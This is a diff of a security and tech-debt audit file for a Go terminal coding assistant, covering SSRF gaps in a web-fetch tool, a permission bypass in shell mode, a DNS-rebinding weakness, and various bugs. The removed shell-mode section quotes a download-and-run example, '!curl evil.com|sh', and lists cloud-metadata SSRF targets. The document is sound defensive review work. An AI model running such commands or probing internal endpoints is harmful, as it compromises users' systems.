@@ -1,561 +1,240 @@
 # Codebase Concerns
 
-**Analysis Date:** 2026-06-02
-
-## Status Note
-
-A previous cross-phase audit (`.planning/audit_phase_0_5.md`, 2026-05-28) flagged 7
-issues (1 CRITICAL, 2 HIGH, 4 MEDIUM). Of those:
-- **CRITICAL** ("binary does not launch TUI") — **fixed** in `cmd/m31a/main.go`
-  which now wires the full app, registry, and Bubble Tea loop.
-- **HIGH** ("permission listener goroutine mutates AppState") — **fixed** in
-  `internal/tui/app.go:423-428` via `permissionListenerCmd` that returns a
-  `tea.Cmd` instead of calling `Update()` from a goroutine.
-- **HIGH** ("SetWidth error not checked") — **fixed** in
-  `internal/tui/repl.go:262-265` (error from `msgRenderer.SetWidth` is now
-  captured into `m.lastStatus`).
-- **MEDIUM** ("Grep/Glob missing DurationMs") — **fixed** in
-  `internal/tools/grep.go:102` and `internal/tools/glob.go:107`.
-- **MEDIUM** ("fmt.Printf for keychain errors") — **fixed** in
-  `internal/config/loader.go:517,530` which now use `slog.Warn`.
-
-The findings below are **new or unaddressed** issues discovered during this
-2026-06-02 sweep.
-
-## Security Considerations
-
-### WebFetch tool has no SSRF protection
-
-**Area:** `internal/tools/webfetch.go`
-
-- **Risk:** The `WebFetch` tool accepts any `http`/`https` URL with no allow-list
-  or IP-range check. A user (or LLM tool-call) can hit `http://localhost:8080`,
-  `http://127.0.0.1`, `http://169.254.169.254` (cloud metadata), or any RFC1918
-  private range. The tool description and current TUI exposes it to the LLM.
-- **Files:** `internal/tools/webfetch.go:55-90`
-- **Current mitigation:** None beyond the 5-redirect cap and 5MB body cap.
-- **Recommendations:** Resolve the URL's host and reject loopback, link-local
-  (`169.254/16`, `fe80::/10`), and RFC1918 ranges by default. Add a
-  `--allow-private-ips` config flag for power users. The Phase-1 audit
-  incorrectly marked "no WebFetch in V1" — the tool was added in Phase 3-4
-  but never received the SSRF protection that the ROADMAP originally specified
-  for V1.1.
-
-### Shell mode (`!command`) bypasses all risk-based permissions
-
-**Area:** `internal/tools/dispatcher.go:110-119` and `internal/tui/repl.go:1025-1031`
-
-- **Risk:** When the user enters `!command` in the REPL, the dispatcher's
-  `interactive=false` branch (lines 110-119) silently approves the tool
-  **regardless of risk level**. Only `deny` rules are honored; `ask` rules
-  and the risk-level default (modal for `RiskDangerous`/`RiskDestructive`) are
-  skipped. A user can type `!sudo rm -rf /tmp/foo` or `!curl evil.com|sh`
-  and it executes without any prompt.
-- **Files:** `internal/tools/dispatcher.go:108-125`, `internal/tui/repl.go:1025-1031`
-- **Current mitigation:** In-line comment claims "PermissionRule deny rules
-  still apply" — this is true but `ask` rules and risk-level gating do not.
-- **Recommendations:** Either (a) require an explicit `shell_allow_risky = true`
-  in `~/.m31a/config.toml` to enable this behavior, or (b) re-introduce the
-  risk-level check after the `interactive=false` branch so destructive commands
-  still surface the modal. The current behavior contradicts the documented
-  safety story in `docs/ARCHITECTURE.md` and the RiskLevel enum.
-
-### Env var name mismatch between `--help` and runtime loader
-
-**Area:** `cmd/m31a/main.go:49-50` vs `internal/config/loader.go:510,524`
-
-- **Risk:** The `--help` output tells users to set `OPENROUTER_API_KEY` and
-  `ZEN_API_KEY`, but `config.Load` reads `M31A_OPENROUTER_API_KEY` and
-  `M31A_ZEN_API_KEY`. Users following `--help` instructions will silently
-  have no API key resolved and be routed into the "No API key configured"
-  REPL. The env var resolution was changed during Phase 11 (per
-  `STATE.md` — "11-02: Multi-Layer Configuration") but `main.go` was not
-  updated to match.
-- **Files:** `cmd/m31a/main.go:49-50`
-- **Current mitigation:** None.
-- **Recommendations:** Either revert loader to also accept the unprefixed
-  names, or update the `--help` output and any README/install docs to use
-  the `M31A_*` prefix. Decide once and document it in `docs/TYPES.md`
-  (which still lists the unprefixed names as canonical).
-
-### Hardcoded `HOME` lookup in ship phase
-
-**Area:** `internal/workflow/ship.go:80-82`
-
-- **Risk:** Ship phase uses `os.Getenv("HOME")` then `os.Getenv("USERPROFILE")`
-  to locate the ledger path, while every other place in the codebase
-  (`internal/log/log.go:15`, `cmd/m31a/main.go:81`, `internal/tui/commands.go:1134,1229`)
-  uses `os.UserHomeDir()`. On chroots, containers, or Windows shells with
-  unusual env, this can return an empty string and silently skip ledger
-  append (the code only logs a warn). The "chore: ship" commit will still
-  be made.
-- **Files:** `internal/workflow/ship.go:79-89`
-- **Current mitigation:** Code checks for empty string and skips append.
-- **Recommendations:** Replace with `os.UserHomeDir()` for consistency and
-  add a hard error if it fails — the user should know ledger updates are
-  being skipped.
-
-### `dispatcher.go` panic on duplicate tool registration
-
-**Area:** `internal/tools/dispatcher.go:66`
-
-- **Risk:** `Register()` calls `panic` if a tool is registered twice. This
-  is a fast-fail in `main` (fine) but `Register` is exported and could be
-  called by plugins or future code paths. Same anti-pattern in
-  `internal/provider/registry.go:24` (panics on empty provider name).
-- **Files:** `internal/tools/dispatcher.go:60-68`, `internal/provider/registry.go:21-28`
-- **Current mitigation:** None — by design.
-- **Recommendations:** Return an `error` from `Register`; let `main.go`
-  decide whether to panic.
-
-## Known Bugs
-
-### `workflowMsgDrainer` silently drops messages when channel is full
-
-**Area:** `internal/tui/app.go:403-410`
-
-- **Symptom:** The `channelEmitter.Emit()` writes to a buffered channel with
-  `select { case ch <- msg: default: slog.Warn(...) }`. Under burst load
-  (e.g. multi-task execute phase), phase events are lost and the TUI may
-  show stale state.
-- **Files:** `internal/tui/app.go:399-410`
-- **Trigger:** Workflow engine emits faster than Bubble Tea drains the channel
-  (default buffer is whatever `make(chan tea.Msg)` allocates — zero).
-- **Workaround:** None.
-- **Fix approach:** Use a larger buffered channel (`make(chan tea.Msg, 64)`)
-  and/or block-with-timeout in `Emit`. Audit the channel constructor at
-  `app.go` initialization.
-
-### Plan screen `E` (Edit) is a no-op
-
-**Area:** `internal/tui/plan.go:69-71`
-
-- **Symptom:** Pressing `E` on the Plan screen silently does nothing.
-  Acceptance criterion 9 says "user can Accept, Edit, or Retry".
-- **Files:** `internal/tui/plan.go:69-71` (`// V1: placeholder for edit`)
-- **Workaround:** Use `R` (Retry) which sends the user back to REPL; there
-  is no way to actually edit a task description inline.
-- **Fix approach:** Either implement the edit flow (open an inline textarea
-  bound to `m.tasks[selected]`) or hide the `E` hint from the toolbar in
-  `View()` at line 91.
-
-### Ship screen `O` (Open in browser) is a no-op
-
-**Area:** `internal/tui/ship.go:54-58`
-
-- **Symptom:** Pressing `O` on the Ship screen does nothing. The hint is
-  shown in the toolbar (`View()` at line 102).
-- **Files:** `internal/tui/ship.go:54-58` (`// Open in browser (V1: placeholder)`)
-- **Fix approach:** Detect a dev-server URL from session goal keywords
-  (e.g. "vite", "next dev", "go run") and shell out to `xdg-open`/`open`/
-  `start`, OR remove the `O` hint and the keybinding.
-
-### `/config <key> <value>` is incomplete
-
-**Area:** `internal/tui/commands.go:648-729`
-
-- **Symptom:** Only 9 specific keys can be set via the `/config` slash
-  command (theme, model.default, ui.compact_mode, ui.show_token_usage,
-  provider.auto_fallback, ledger.enabled, permissions.mode,
-  ui.show_cost_estimate, model.auto_arbitrage). All other valid config
-  keys (provider.openrouter.api_key, provider.zen.api_key, model.*,
-  ui.max_iterations, permissions.rules, features.*, ledger.max_entries)
-  are not settable via `/config`.
-- **Files:** `internal/tui/commands.go:658` (`// Setting a config value (V1: simple key=value via dot notation)`)
-- **Workaround:** Use the Settings screen (`/settings`) or edit
-  `~/.m31a/config.toml` directly.
-- **Fix approach:** Either implement generic dotted-path setter using
-  reflection, or make `/config` return the list of settable keys when
-  called with a single argument (now it returns `Unknown config key`).
+**Analysis Date:** 2026-06-04
 
 ## Tech Debt
 
-### Missing workflow slash commands required by acceptance criteria
+**`closeOnces` sync.Map unbounded growth:**
+- Issue: The global `var closeOnces sync.Map` in `internal/tui/app.go:462` stores `*sync.Once` entries for every channel closed via `safeCloseOnce()`. Entries are never removed. Each workflow phase transition creates new channels and adds entries.
+- Files: `internal/tui/app.go:462-476`
+- Impact: Over a long session with many phase transitions, this map grows without bound. In practice the leak is small per-session (a few entries per phase), but it is architecturally incorrect.
+- Fix approach: Either use a per-`AppState` map that is cleaned up on session end, or switch to a different close-guard pattern that does not require global bookkeeping (e.g., store the `sync.Once` inside the channel wrapper struct).
 
-**Area:** `internal/tui/commands.go:162-191` (`DefaultCommands`)
+**`Stream: false` in streaming LLM calls:**
+- Issue: Both `streamLLM()` (`internal/workflow/engine.go:517`) and `streamLLMStreaming()` (`internal/workflow/engine.go:546`) set `Stream: false` in the `ChatRequest`, but then call `provider.ChatCompletionStream()` which sends `stream: true` in the HTTP body. The request's `Stream` field is ignored by the provider clients (they always hardcode `"stream": true` in the JSON body), making the field misleading.
+- Files: `internal/workflow/engine.go:514-519`, `internal/workflow/engine.go:543-548`
+- Impact: Dead code / confusion. The `Stream` field on `ChatRequest` is effectively unused.
+- Fix approach: Either use `req.Stream` in the provider clients' JSON construction, or remove the `Stream` field from `ChatRequest` since it is always overridden.
 
-- **Issue:** `REQUIREMENTS.md` criterion 19 requires
-  `/new`, `/plan`, `/execute`, `/verify`, `/ship`, `/workflow`, `/pause`,
-  `/resume-task`. The actual implementation provides `/workflow <goal>`
-  and `/phase <phase> <goal>`. There is no `/pause`, `/resume-task`,
-  or per-phase shortcut (`/plan`, `/execute`, etc.). Criterion 22 also
-  requires `/optimize` for the arbitrage feature — not registered.
-- **Files:** `internal/tui/commands.go:162-191`
-- **Impact:** The roadmap and requirements mark these as V1 acceptance
-  criteria. The CHANGELOG claims v1.0.0 is shipped (2026-05-29), but
-  these commands are absent.
-- **Fix approach:** Add aliases in `DefaultCommands()` (e.g.
-  `/plan → /phase plan`, `/execute → /phase execute`) and wire
-  `app.go:1021-1071` interception to also match them. Register
-  `/optimize` as a thin wrapper around the existing `pkg/arbitrage`
-  recommend path already used in `repl.go:461`. Add `/pause` and
-  `/resume-task` (or remove them from criteria).
+**Hardcoded model capability map:**
+- Issue: `openrouterModelCapabilities` in `internal/provider/openrouter/client.go:48-60` is a hardcoded map of ~11 model IDs to capability flags. Models not in this map fall back to heuristic string-sniffing of the tokenizer/modality fields.
+- Files: `internal/provider/openrouter/client.go:48-60`, `internal/provider/openrouter/client.go:186-195`
+- Impact: New models are not correctly classified until the code is updated. The heuristic fallback (checking for "tools" in tokenizer string or "r1" in ID) is fragile.
+- Fix approach: Prefer capabilities from the provider API response if available, or move the map to a config file that can be updated without recompilation.
 
-### Zen client always advertises `Tools: true` regardless of model
+**Hardcoded `normalizeToolName` only covers 5 tools:**
+- Issue: `normalizeToolName()` in `internal/workflow/engine.go:975-991` maps LLM aliases to registered tool names for Bash, FileRead, FileWrite, Glob, and Grep only. The Edit and WebFetch tools have no aliases.
+- Files: `internal/workflow/engine.go:974-991`
+- Impact: If an LLM emits `"edit"` or `"web_fetch"` as a tool name, it will not be routed to the correct tool implementation.
+- Fix approach: Add aliases for Edit (`"edit"`, `"search_replace"`) and WebFetch (`"web_fetch"`, `"fetch"`, `"http_get"`).
 
-**Area:** `internal/provider/zen/client.go:150-153`
+**Deprecated `safeClose` alias still present:**
+- Issue: `safeClose()` in `internal/tui/app.go:478-481` is marked as deprecated but still called from `RunPhaseCmd()` at line 356. This creates inconsistency — some code uses `safeClose`, some uses `safeCloseOnce`.
+- Files: `internal/tui/app.go:356`, `internal/tui/app.go:478-481`
+- Impact: Code confusion; the deprecation is misleading since it is still actively used.
+- Fix approach: Migrate all callers to `safeCloseOnce` and remove the `safeClose` alias.
 
-- **Issue:** The Zen model catalog response (`/models` endpoint) doesn't
-  include capability flags, so the client hardcodes
-  `Capabilities: types.CapFlags{Tools: true, Reasoning: false}` for every
-  model. This causes tool calls to be sent to models that may not support
-  them, leading to provider-side 400 errors that surface to the user as
-  `ErrContextExceeded` or generic `tool execution failed`.
-- **Files:** `internal/provider/zen/client.go:131-156`
-- **Impact:** Tool-use fails silently for unsupported models; user sees
-  cryptic errors.
-- **Fix approach:** Maintain a static map of known Zen model capabilities
-  (similar to `reasoning.go`'s prefix map), fall back to `Tools: false`
-  for unknown IDs, and emit a warning to the log on fallback.
+**`mergeConfig` is field-by-field manual merge:**
+- Issue: `mergeConfig()` in `internal/config/loader.go:118-199+` manually checks and copies every config field. Adding a new config field requires updating this function. This is error-prone and tedious.
+- Files: `internal/config/loader.go:118-199+` (continues for ~150 lines)
+- Impact: High maintenance cost; new config fields can silently be ignored by project-level configs.
+- Fix approach: Use reflection-based merge (check non-zero values), or switch to a layered config library, or generate the merge function.
 
-### OpenRouter capability detection is string-sniff based
+## Known Bugs
 
-**Area:** `internal/provider/openrouter/client.go:158-167`
+**Verify fallback uses `HEAD~50` which may not exist:**
+- Symptoms: When `sessionStartHash` is empty (e.g., git operations failed during Initialize), `verify.go:63` falls back to `"HEAD~50"` as the bisect "good" commit. If the repository has fewer than 50 commits, this fails silently and bisect produces incorrect results.
+- Files: `internal/workflow/verify.go:59-64`
+- Trigger: Session starts in a shallow repository or a repository with fewer than 50 commits, AND verification fails after max heal attempts.
+- Workaround: Ensure `sessionStartHash` is always captured in Initialize phase.
 
-- **Issue:** `Tools: strings.Contains(m.Architecture.Tokenizer, "tools") || strings.Contains(m.Architecture.Modality, "tool")`
-  and
-  `Reasoning: strings.Contains(m.Description, "reasoning") || strings.Contains(m.ID, "r1")`
-  are fragile heuristics. A description change from the provider breaks
-  capability detection without any test catching it.
-- **Files:** `internal/provider/openrouter/client.go:162-167`
-- **Impact:** Tools or thinking may be silently disabled or enabled
-  incorrectly.
-- **Fix approach:** Add an explicit `supported_parameters` or
-  `capabilities` field check, and fall back to a per-ID allow-list for
-  known models (similar to `reasoning.go`).
+**Discuss timeout not configurable:**
+- Symptoms: The discuss Q&A timeout is hardcoded to 5 minutes (`internal/tui/app_workflow.go:148-161`). This is not exposed via config.
+- Files: `internal/tui/app_workflow.go:147-161`, `internal/tui/app_update.go:705-711`
+- Trigger: User takes more than 5 minutes to answer a discuss question. The timeout fires and auto-skips remaining questions.
+- Workaround: None — the user loses the chance to answer.
 
-### Sequential task execution limits V1 throughput
+**Permission timeout default mismatch risk:**
+- Symptoms: `Dispatcher` defaults `permissionTimeout` to 300 seconds (`internal/tools/dispatcher.go:45`), while the TUI uses `components.DefaultPermissionTimeout` for the modal timer. If these values diverge, the modal could auto-deny before the dispatcher's timeout fires.
+- Files: `internal/tools/dispatcher.go:45`, `internal/tui/app_update.go:630-632`
+- Trigger: If `config.Permissions.TimeoutSeconds` is not set and the components package default differs from 300.
+- Workaround: Ensure both defaults match.
 
-**Area:** `pkg/taskrunner/runner.go:59`
+**Git operations ignore errors silently in workflow phases:**
+- Symptoms: In `internal/workflow/ship.go:62` and `internal/workflow/execute.go:247`, errors from `git.HeadHash()` and `git.Log()` are silently discarded with `_ =`.
+- Files: `internal/workflow/ship.go:62`, `internal/workflow/execute.go:247`, `internal/workflow/execute.go:344`
+- Trigger: Git operations fail (e.g., detached HEAD, empty repository).
+- Workaround: None — missing commit hashes or log entries silently degrade the Ship summary.
 
-- **Issue:** The runner comment says "In V1, tasks within a group run
-  sequentially" but the topological sort already groups independent
-  tasks. This is by design for V1, but a user with a 20-task plan where
-  10 are independent pays a 10x latency tax.
-- **Files:** `pkg/taskrunner/runner.go:59` (comment), `:ExecuteGroup` (loop)
-- **Impact:** Workflow takes 5-30 minutes longer than necessary on
-  parallelizable plans.
-- **Fix approach:** Document the limitation prominently in
-  `docs/ARCHITECTURE.md` and `README.md`, or expose
-  `M31A_PARALLEL_TASKS=2|3` env var to opt into bounded concurrency
-  within a group (gated by Bubble Tea's single-threaded model, since
-  tool dispatch is already async).
+## Security Considerations
 
-### `renderMessages()` rebuilds the full viewport on every stream chunk
+**SSRF protection TOCTOU gap in WebFetch:**
+- Risk: `WebFetch.DialContext` checks only the first resolved IP address (`internal/tools/webfetch.go:49`) against the private IP filter, but `resolveAndCheck()` checks all resolved addresses. An attacker could use DNS rebinding: the first resolution returns a public IP (passes the DialContext check), but subsequent connections resolve to a private IP.
+- Files: `internal/tools/webfetch.go:49`, `internal/tools/webfetch.go:160-165`
+- Current mitigation: The DialContext does a "paranoid check" after connecting (line 64-69), but this only catches cases where the OS resolver returns a different IP than the Go resolver.
+- Recommendations: Use a DNS cache that pins the resolved IP for the entire request lifecycle, or check all resolved addresses in `DialContext` before connecting.
 
-**Area:** `internal/tui/repl.go` (search for `renderMessages`)
+**`os.Exit(1)` in library code:**
+- Risk: `NewApp()` in `internal/tui/app.go:206` calls `os.Exit(1)` if the tool dispatcher fails to initialize. This is in library/constructor code, not main().
+- Files: `internal/tui/app.go:206`
+- Current mitigation: None — the process terminates without cleanup.
+- Recommendations: Return an error from `NewApp()` instead. Let `cmd/m31a/main.go` handle the exit.
 
-- **Issue:** The REPL calls `m.renderMessages()` from `handleStreamMsg`
-  on every `StreamMsg`. Each call walks all messages and rebuilds a
-  multi-kilobyte string. The 16ms frame budget (Phase 2 spec) can be
-  exceeded on long conversations during high-rate token streams.
-- **Files:** `internal/tui/repl.go:handleStreamMsg` and `renderMessages`
-- **Impact:** UI jank during long responses; potential for missed
-  `tea.Tick` intervals.
-- **Fix approach:** Cache the rendered string and only re-render the
-  trailing message (`m.messages[len(m.messages)-1]`). Add a benchmark
-  in `internal/tui/repl_test.go` to catch regressions.
+**API key stored in `AppState.apiKey` field:**
+- Risk: The API key is held in the `AppState.apiKey` string field (`internal/tui/app.go:70`). While Go strings are immutable, this field persists in memory for the entire session lifetime and could be exposed via memory dumps or core files.
+- Files: `internal/tui/app.go:70`
+- Current mitigation: API keys are resolved from env var → keychain → config file, with keychain preferred.
+- Recommendations: Consider zeroing the key after use (not possible with Go strings), or keeping it only in the provider clients and not propagating it to AppState.
 
-### Phase 11 Adaptations vs original docs diverge
-
-**Area:** `docs/ARCHITECTURE.md`, `docs/INTERFACES.md`, `docs/TYPES.md`
-
-- **Issue:** The interface and types docs were last updated in Phase 0/1
-  and still describe the original Phase 0 design. New fields like
-  `ModelInfo.Variant`, `RecentModelsData`, `SkipForLLM` on
-  `types.Message`, `ParentID`/`ChildrenIDs` on `Session`, and
-  `PermissionsAgentConfig` are not mirrored in `docs/INTERFACES.md`.
-  The Phase 12 prompt-history-frecency code (`internal/tui/history.go`)
-  and the `@filepath` regex in `repl.go:23` are undocumented.
-- **Files:** `docs/INTERFACES.md`, `docs/TYPES.md`, `docs/ARCHITECTURE.md`
-- **Impact:** Future LLM context for planning/execution will work from
-  outdated interface definitions.
-- **Fix approach:** Run `/gsd-docs-update` or have `/gsd-map-codebase`
-  re-emit `INTEGRATIONS.md` and `STRUCTURE.md` after every phase to keep
-  the docs in sync.
+**Backup directory accumulation:**
+- Risk: `FileWrite` creates a backup on every file write (`internal/tools/filewrite.go:113-134`). There is no pruning mechanism. Over a long session with many file edits, the backup directory grows unbounded.
+- Files: `internal/tools/filewrite.go:113-134`
+- Current mitigation: None.
+- Recommendations: Add backup pruning (e.g., keep last N backups per file, or cap total backup size).
 
 ## Performance Bottlenecks
 
-### Auto-arbitrage fires a full model fetch on every submit
+**`listCwdFiles` uses `filepath.Walk` (O(n) on large repos):**
+- Problem: `listCwdFiles()` in `internal/workflow/engine.go:1155-1190` walks the entire working directory tree. While it skips known heavy directories (`node_modules`, `vendor`, etc.) and limits depth to 3, the initial walk is still O(n) where n is the total file count.
+- Files: `internal/workflow/engine.go:1155-1190`
+- Cause: `filepath.Walk` traverses all directories before applying skip logic.
+- Improvement path: Use `filepath.WalkDir` (cheaper per-entry) or `os.ReadDir` for shallower enumeration. For very large repos, consider caching the file list.
 
-**Area:** `internal/tui/repl.go:451-470`
+**HTML-to-Markdown conversion uses repeated string operations:**
+- Problem: `htmlToMarkdown()` and helper functions in `internal/tools/webfetch.go:286-538` use repeated `strings.Index`, `strings.ReplaceAll`, and `strings.ToLower` operations on the full HTML body. Each pass re-lowers the entire string.
+- Files: `internal/tools/webfetch.go:286-538`
+- Cause: Naive regex-less HTML parsing with multiple full-body passes.
+- Improvement path: Use a single-pass HTML parser (e.g., `golang.org/x/net/html`) for production use, or accept the current approach since WebFetch response bodies are capped at 5MB.
 
-- **Problem:** When `model.auto_arbitrage = true`, every user message
-  triggers `p.FetchModels(fetchCtx)` (line 453) before sending. This
-  is a network round-trip and JSON parse of the entire model catalog
-  on every keystroke-and-submit, even though the result is already
-  cached in `provider.ModelCache`.
-- **Files:** `internal/tui/repl.go:451-470`
-- **Cause:** Reaches past the cached models already loaded into
-  `m.activeModel` and re-fetches from the network.
-- **Improvement path:** Use the in-memory `p.(interface {
-  CachedModels() []types.ModelInfo })` or expose a method on the
-  registry. The cache has a 5-minute TTL, so this is essentially free
-  data.
+**`extractJSONObject` re-scans from each `{` position:**
+- Problem: `parseToolCalls()` in `internal/workflow/engine.go:848-877` scans the content byte-by-byte looking for `{`, then calls `extractJSONObject()` which re-parses the entire remaining string. For large LLM responses with many JSON objects, this is O(n*m) where n is content length and m is the number of objects.
+- Files: `internal/workflow/engine.go:848-877`
+- Cause: Linear scan + nested extraction without maintaining position.
+- Improvement path: The `maxJSONScanBytes` cap (64KB) limits the worst case. This is acceptable for V1.
 
-### Grep `rg` output is fully buffered before parsing
-
-**Area:** `internal/tools/grep.go:127-174`
-
-- **Problem:** `cmd.Output()` reads the entire ripgrep JSON output
-  into memory before line-splitting and unmarshaling. On a large repo
-  with many matches, this can allocate many MB and block the tool
-  goroutine.
-- **Files:** `internal/tools/grep.go:139-145`
-- **Improvement path:** Use `cmd.StdoutPipe()` + a `bufio.Scanner` that
-  emits a `StreamChunk` per line — same approach as the streaming
-  provider.
+**`closeOnces` sync.Map lookup on every channel close:**
+- Problem: Every call to `safeCloseOnce()` does a `LoadOrStore` on a global `sync.Map`, which involves a hash lookup.
+- Files: `internal/tui/app.go:462-476`
+- Cause: Using `sync.Map` for a pattern that only needs a simple once-per-channel guarantee.
+- Improvement path: Since channels are short-lived and the number is small, use a per-channel approach (store `sync.Once` in the same struct as the channel) instead of a global map.
 
 ## Fragile Areas
 
-### Self-heal loop control flow is off-by-one risky
+**Workflow engine (`internal/workflow/engine.go`):**
+- Files: `internal/workflow/engine.go` (1357 lines)
+- Why fragile: This single file contains the engine struct, all message types, prompt loading, task parsing, JSON extraction, tool call normalization, project detection, question parsing, verification logic, and multiple helper functions. Changes to one area risk regressions in others.
+- Safe modification: Extract message types to a separate file (`messages.go`). Extract parsing functions to `parse.go`. Extract verification to a separate verifier.
+- Test coverage: Has `engine_test.go`, `execute_test.go`, `plan_test.go`, `verify_test.go`, `ship_test.go`, `initialize_test.go`, `discuss_test.go`, `integration_test.go`, and many focused test files. Coverage is good for the workflow package.
 
-**Area:** `internal/workflow/execute.go:106-200`
+**TUI app_update.go message handler:**
+- Files: `internal/tui/app_update.go` (1238 lines)
+- Why fragile: The `Update()` method handles 20+ message types in a single giant switch statement. Adding a new message type requires finding the right place in this switch, and changes to one case can subtly affect others through shared state.
+- Safe modification: Extract message handlers into separate methods per screen (some already exist like `handleAppMsg`). Consider a handler map pattern.
+- Test coverage: Has `app_test.go` and `app_update_nilsafety_test.go`. Coverage focuses on nil-safety and specific message paths.
 
-- **Files:** `internal/workflow/execute.go:106-200`,
-  `internal/workflow/verify.go:39-110`
-- **Why fragile:** The loop is
-  `for task.HealsAttempted <= m31types.MaxHealAttempts`
-  with `MaxHealAttempts = 2` and `task.HealsAttempted++` inside on
-  failure. This iterates 3 times on a persistent failure (heals 0, 1, 2)
-  before returning `max heal attempts exceeded`. The comments in
-  `types/constants.go:10` say "Maximum self-heal retries for a failed
-  task" — ambiguous whether the count includes or excludes the initial
-  attempt. Different code paths in `execute.go` and `verify.go` mutate
-  `task.HealsAttempted` independently (verify mutates the slice
-  element; execute mutates the local copy), so the two phases can
-  disagree on attempt count if a task is verified across multiple
-  phases.
-- **Safe modification:** Define a single `attemptHeal(task *Task)` helper
-  that returns `(shouldRetry bool, maxExceeded bool)`, and have both
-  phases call it. Test with a 3-strike fixture.
-- **Test coverage gaps:** No test verifies the `MaxHealAttempts = 2`
-  boundary (3 attempts vs 2 retries).
+**Streaming pipeline:**
+- Files: `internal/tui/streaming.go`, `internal/tui/repl_stream.go`, `internal/tui/repl.go`
+- Why fragile: The streaming pipeline spans three files with complex goroutine/channel interactions. The comments reference multiple historical fixes (C-3, M-21, M-35-36) indicating this area has been error-prone.
+- Safe modification: Do not modify channel ownership or goroutine lifecycle without running `go test -race` on the full test suite.
+- Test coverage: Has `streaming_test.go`, `segment_concurrency_test.go`. Coverage includes double-close, nil channel, and concurrency tests.
 
-### SSE parser buffer is 64KB
-
-**Area:** `internal/provider/sse.go:17-18`
-
-- **Files:** `internal/provider/sse.go:17-18`
-- **Why fragile:** `scanner.Buffer(make([]byte, 0, 65536), 65536)` caps
-  each line at 64KB. Some providers (especially with large
-  `tool_calls.function.arguments` deltas) emit single lines larger than
-  64KB. The scanner returns `bufio.ErrTooLong` and the entire stream
-  fails.
-- **Safe modification:** Raise to 1MB; verify with a fixture that emits
-  a 200KB single-line event.
-- **Test coverage:** No oversized-payload test exists.
-
-### Channel emitter `default` drop in `app.go`
-
-**Area:** `internal/tui/app.go:399-410` (already mentioned above)
-
-- Re-listing as fragile: the `select { default: slog.Warn }` pattern
-  means a phase event is lost without retry. A test that drives the
-  workflow engine faster than the Bubble Tea update loop can reproduce.
-
-### `cmd/test_zen/main.go` is a stray binary checked into source
-
-**Area:** `cmd/test_zen/main.go`
-
-- **Files:** `cmd/test_zen/main.go` (120 lines)
-- **Why fragile:** Lives in `cmd/` and is a separate `main` package.
-  `go build ./...` will compile it as `test_zen`, and the goreleaser
-  config may attempt to package it. There is no test or doc explaining
-  when to run it; it's a smoke test for the Zen client.
-- **Recommendation:** Move to `cmd/test_zen/main_test.go` or to
-  `internal/provider/zen/smoketest_test.go` behind a build tag, and
-  add a comment explaining its purpose.
+**Permission system:**
+- Files: `internal/tools/permissions.go`, `internal/tools/dispatcher.go`
+- Why fragile: The permission check flow has multiple code paths: rule-based (allow/deny/ask), agent-based defaults, risk-level fallback, and timeout handling. The interaction between these paths is complex.
+- Safe modification: Add unit tests for each permission path before modifying.
+- Test coverage: Has `dispatcher_test.go`, `permission_timeout_test.go`. Missing dedicated `permissions_test.go` for glob matching logic.
 
 ## Scaling Limits
 
-### Model cache is per-client and unshared across providers
+**Session file accumulation:**
+- Current capacity: Unbounded. Each session creates a directory under `~/.m31a/sessions/` with JSON files, planning files, checkpoints, and backups.
+- Limit: Disk space. No automatic cleanup of old sessions.
+- Scaling path: Add session pruning (e.g., auto-archive sessions older than 30 days).
 
-**Area:** `internal/provider/cache.go`, `internal/provider/openrouter/client.go:48-55`
+**Ledger file growth:**
+- Current capacity: `config.Ledger.MaxEntries` controls the cap (default varies). Entries are appended as markdown.
+- Limit: The ledger re-parses the entire file on load (`ledger.go:74`). With thousands of entries, startup time degrades.
+- Scaling path: Binary format or indexed file for large ledgers.
 
-- **Current capacity:** A few hundred models per provider (OpenRouter
-  has ~300, Zen has ~30). No memory issues at this scale.
-- **Limit:** The cache stores `*types.ModelInfo` pointers; if a future
-  provider exposes 10k+ models, the in-memory map grows. No eviction
-  policy beyond the 24h stale TTL.
-- **Scaling path:** LRU eviction with max-size config; or move to a
-  disk-backed bbolt.
-
-### Session list scan walks filesystem
-
-**Area:** `pkg/session/manager.go` (ListSessions, archive)
-
-- **Current capacity:** A few hundred sessions per user is typical.
-- **Limit:** `ListSessions` reads `session.json` from every directory
-  under `~/.m31a/sessions/` on every call. With 1000 sessions this is
-  1000 JSON parses on the main goroutine, called from the resume
-  screen. UI will lag.
-- **Scaling path:** Cache the sorted list in memory and invalidate
-  on session create/delete/archive. Add an index file (`index.json`)
-  that maps session ID → modified time, parse that first, then
-  hydrate only visible sessions.
+**Provider model cache:**
+- Current capacity: ~10,000 models (typical OpenRouter catalog). Cached in memory.
+- Limit: Memory usage proportional to model count. Each `ModelInfo` is ~200 bytes.
+- Scaling path: Not an issue for V1. Models are evicted after TTL expiry.
 
 ## Dependencies at Risk
 
-### `github.com/pkoukk/tiktoken-go` for token estimation
+**`golang.org/x/sync/singleflight`:**
+- Risk: Used in `internal/provider/cache.go` for deduplicating model refresh calls. This is a stable `x/` package but adds a dependency.
+- Impact: Low — widely used, well-maintained.
+- Migration plan: N/A — appropriate usage.
 
-**Area:** `internal/tokens/estimator.go:8`, `go.mod`
+**`github.com/bmatcuk/doublestar/v4`:**
+- Risk: Used in `internal/tools/permissions.go` for glob pattern matching. The v4 major version may have breaking changes.
+- Impact: Low — used only for permission rule matching.
+- Migration plan: Pin to current version; check for updates before major releases.
 
-- **Risk:** `tiktoken-go` is a pure-Go port but is not officially
-  maintained by OpenAI. Releases have stalled since 2024. If a new
-  tokenizer (e.g. `o200k_base` for GPT-4o) ships, M31A will silently
-  fall back to the rune-count heuristic.
-- **Impact:** Token estimates become ±30% inaccurate for newer models.
-- **Migration plan:** Add a fallback to `github.com/tiktoken-go-pro/tiktoken-go`
-  or to the official OpenAI CGO library (would break `CGO_ENABLED=0`).
-
-### `github.com/charmbracelet/*` rapid release cadence
-
-**Area:** `go.mod` (charmbracelet/bubbletea, lipgloss, bubbles, glamour)
-
-- **Risk:** Charm libraries release breaking changes regularly. The
-  current `go.sum` pins to versions from late 2024 / early 2025; a
-  `go get -u` may break the TUI.
-- **Mitigation:** `go.mod` uses specific versions; no `latest` pseudo.
-
-## Test Coverage Gaps
-
-### No tests for `cmd/m31a/main.go`
-
-- **What's not tested:** Config loading, provider registration,
-  Bubble Tea startup, error paths on missing config / keychain.
-- **Files:** `cmd/m31a/main.go:189` lines
-- **Risk:** Refactor of `main.go` can silently break startup; CI
-  won't catch it.
-- **Priority:** High — main is the only entry point.
-
-### No tests for `internal/log/log.go`
-
